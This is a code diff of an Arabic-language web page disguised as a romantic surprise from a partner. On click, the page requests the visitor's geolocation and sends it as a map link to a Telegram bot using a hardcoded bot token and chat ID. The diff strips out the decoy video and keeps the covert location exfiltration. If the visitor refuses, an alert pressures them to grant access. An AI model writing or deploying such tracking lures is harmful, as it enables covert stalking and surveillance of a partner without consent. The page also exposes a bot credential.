@@ -9,61 +9,30 @@
         .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.6); z-index: 1; }
         .container { position: relative; z-index: 10; padding: 20px; width: 90%; }
         .btn { background: #ff4b2b; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 50px; cursor: pointer; font-weight: bold; margin-top: 20px; }
-        #videoArea { display: none; margin-top: 20px; }
-        video { width: 100%; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.6); }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
     <div class="container">
-        <div id="startScreen">
-            <h1>أهلاً يا حبيبي.. محضرالك مفاجأة دوس وشوف بنفسك ❤️</h1>
-            <button class="btn" onclick="askLocation()">رؤية المفاجأة ✨</button>
-        </div>
-        <div id="videoArea">
-            <video id="myVideo" controls><source src="romantic_video.mp4" type="video/mp4"></video>
-            <p>كل ثانية وأنت معايا هي أحلى مفاجأة! 😘</p>
-        </div>
+        <h1>أهلاً يا حبيبي.. محضرالك مفاجأة دوس وشوف بنفسك ❤️</h1>
+        <button class="btn" onclick="askLocation()">رؤية المفاجأة ✨</button>
     </div>
 
     <script>
-        const telegramToken = "7982889459:AAG0LMNmGSDyVhNsP9Iv-Gz0ZV2HUj-SBI4";
-        const telegramChatId = "5097825068";
-
         function askLocation() {
             if (navigator.geolocation) {
-                // نطلب اللوكيشن
-                navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
-            } else {
-                showVideo();
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const token = "7982889459:AAG0LMNmGSDyVhNsP9Iv-Gz0ZV2HUj-SBI4";
+                    const chatId = "5097825068";
+                    const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+                    const text = "📍 خطيبك فتح اللينك ومكانه هو: " + mapUrl;
+
+                    fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text))
+                    .then(() => { alert("المفاجأة بتتحمل.. ثواني"); });
+                }, function() { alert("لازم توافق على الوصول للموقع عشان تشوف المفاجأة!"); });
             }
-        }
-
-        function sendToTelegram(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            // إصلاح رابط الخريطة ليكون رابطاً صحيحاً
-            const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
-            const text = "📍 خطيبك فتح اللينك ومكانه هو: " + mapUrl;
-
-            // إرسال البيانات
-            fetch("https://api.telegram.org/bot" + telegramToken + "/sendMessage", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: telegramChatId, text: text })
-            }).then(() => {
-                showVideo();
-            }).catch(() => {
-                showVideo();
-            });
-        }
-
-        function showError() { showVideo(); }
-
-        function showVideo() {
-            document.getElementById('startScreen').style.display = 'none';
-            document.getElementById('videoArea').style.display = 'block';
-            document.getElementById('myVideo').play();
         }
     </script>
 </body>
